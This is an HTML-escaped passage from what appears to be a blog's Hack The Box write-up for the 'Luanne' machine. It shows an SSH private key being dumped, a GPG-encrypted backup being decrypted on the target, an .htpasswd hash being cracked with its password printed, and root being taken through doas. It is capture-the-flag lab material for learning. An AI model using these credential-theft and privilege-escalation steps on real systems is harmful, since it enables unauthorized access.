&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id_rsa&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;id_rsa&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;16-Sep-2020 16:52&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;3kB
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So looks like this old exploit still works on that box, which is a bit strange, but we do notice a directory listing conveniently containing an &lt;strong&gt;id_rsa&lt;/strong&gt; key. We try to dump its content using the same technique:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_02-36-44.png&quot; alt=&quot;Screenshot_2021-03-19_02-36-44&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We copy this private key on our own box, &lt;strong&gt;chmod&lt;/strong&gt; it to 600 and attempt to &lt;strong&gt;ssh&lt;/strong&gt; as &lt;strong&gt;r.michaels&lt;/strong&gt; using this private key. The connection is successful and we have a now shell as &lt;strong&gt;r.michaels.&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;rmichaels-to-root&quot;&gt;r.michaels to root&lt;/h3&gt;

&lt;p&gt;We start by enumerating what in our &lt;em&gt;/home&lt;/em&gt; directory. At this point we are able to grab the 🏳&lt;strong&gt;user.txt&lt;/strong&gt; 🏳 flag. Enumerating further, we notice a &lt;em&gt;backups&lt;/em&gt; directory with a interesting &lt;em&gt;devel_backup-2020-09-16.tar.gz.enc&lt;/em&gt;. The “enc” extension seem to suggest this is an encrypted files, which we confirm by check its type and entropy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-19_02-46-23.png&quot; alt=&quot;Screenshot_2021-03-19_02-46-23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Compressed and encrypted files will generally have a very high entropy value closing on 8 bits per bytes (theoretical maximum, I believe).&lt;/p&gt;

&lt;p&gt;We move on for now and continue more enumeration by running &lt;strong&gt;linpeas&lt;/strong&gt; on the machine. From its result we noticed that we can use the &lt;strong&gt;doas&lt;/strong&gt; command as root, given we have the “&lt;em&gt;permit r.michaels as root&lt;/em&gt;” configuration set, this does not seem to work right away though, as our current password (&lt;strong&gt;iamthebest&lt;/strong&gt;) is invalid.&lt;/p&gt;

&lt;p&gt;Linpeas further reveals that we have mails available under &lt;em&gt;/var/mail/r.michaels&lt;/em&gt;. We consult them and they are all roughly the same message from &lt;strong&gt;vi&lt;/strong&gt; informing us of recovery file having been saved of a &lt;em&gt;a.lua&lt;/em&gt; file that was being edited by &lt;strong&gt;r.michaels&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;email-enumeration&quot;&gt;Email Enumeration&lt;/h4&gt;

&lt;p&gt;Going through the emails, we get roughly the same message that &lt;em&gt;a.lua was being edited by r.michaels on Sep 15 09:46:10 2020&lt;/em&gt;. The stated command “&lt;strong&gt;vi -r a.lua&lt;/strong&gt;” does not work as it cannot find the recovery directory. We attempt to find additional recovery directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*recover*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;  2&amp;gt;/dev/null 
&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  338 Feb 14  2020 /etc/rc.d/virecover
&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  19016 Feb 14  2020 /usr/bin/bzip2recover
&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  1165 Feb 14  2020 /usr/libexec/virecover
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, all of the above are empty. That being said, seeing that the user was active on the 15-16 of September, we try to &lt;strong&gt;find&lt;/strong&gt; for files that were edited ever since:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luanne&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-mtime&lt;/span&gt; 185 &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null  

&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  142 Sep 14  2020 /etc/usermgmt.conf
&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root  wheel  192 Sep 14  2020 /var/db/dhcpcd/secret
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  1948 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+CONTENTS
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  58 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+COMMENT
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  529 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+DESC
&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  3656 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+INSTALL
&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  3235 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+DEINSTALL
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  799 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+BUILD_VERSION
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  2680 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+BUILD_INFO
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  8 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+SIZE_PKG
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  8 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+SIZE_ALL
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  58 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+ALTERNATIVES
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  0 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+REQUIRED_BY
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  14 Sep 14  2020 /var/db/pkg/lua53-5.3.5/+INSTALLED_INFO
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root  wheel  489 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+CONTENTS
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  33 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+COMMENT
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  728 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+DESC
&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  5387 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+INSTALL
&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root  wheel  3054 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+DEINSTALL
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  231 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+BUILD_VERSION
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  2395 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+BUILD_INFO
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  6 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+SIZE_PKG
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root  wheel  6 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+SIZE_ALL
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 root  wheel  1656 Sep 14  2020 /var/db/pkg/doas-6.2p4nb1/+PERMS
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root  wheel  156 Sep 14  2020 /var/log/xferlog
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 r.michaels  &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;603 Sep 14  2020 /home/r.michaels/.gnupg/pubring.gpg
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 r.michaels  &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;1291 Sep 14  2020 /home/r.michaels/.gnupg/secring.gpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It is not surprising to see the Lua files there, but we also see that the &lt;strong&gt;doas&lt;/strong&gt; binary was added in that time frame, which strongly suggest it will come in handy. Finally, we noticed the user generated recently some &lt;strong&gt;gpg&lt;/strong&gt; keys in their home directory. We missed this as first, but we are able to retrieve the keys.&lt;/p&gt;

&lt;h4 id=&quot;gpg-decrypt&quot;&gt;GPG Decrypt&lt;/h4&gt;

&lt;p&gt;First, we’d want to confirm that the encrypted backup file we previously saw was indeed encrypted using gpg:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Screenshot_2021-03-17_23-33-01.png&quot; alt=&quot;Screenshot_2021-03-17_23-33-01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We attempt to decrypt it locally, however we are asked for a passphrase, and all our gathered credentials so far do not work. We were about to use &lt;strong&gt;gpg2john&lt;/strong&gt; in order to attempt cracking the private key, however we stumbled on this: https://unix.stackexchange.com/questions/395875/gpg-does-not-ask-for-password, which made us try to decrypt the file remotely on luanne.&lt;/p&gt;

&lt;p&gt;The decryption worked and we find out a backup of the API folder and files, including an old &lt;em&gt;.htpasswd&lt;/em&gt; file, which we successful crack using &lt;strong&gt;hashcat&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Going back to the &lt;strong&gt;doas&lt;/strong&gt; command earlier, we try again with this old password:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;luanne&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;doas sh
Password: &lt;span class=&quot;c&quot;&gt;#littlebear                                                                  &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# id &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kmem&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;operator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,20&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;staff&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,31&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;guest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,34&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nvmm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We are in as &lt;strong&gt;root&lt;/strong&gt; and gain the 🏴 &lt;strong&gt;root.txt&lt;/strong&gt; 🏴 flag.&lt;/p&gt;</content><author><name>stbl</name><email>g0rth0r@lolnight.lol</email></author><category term="htb" /><summary type="html"></summary></entry></feed>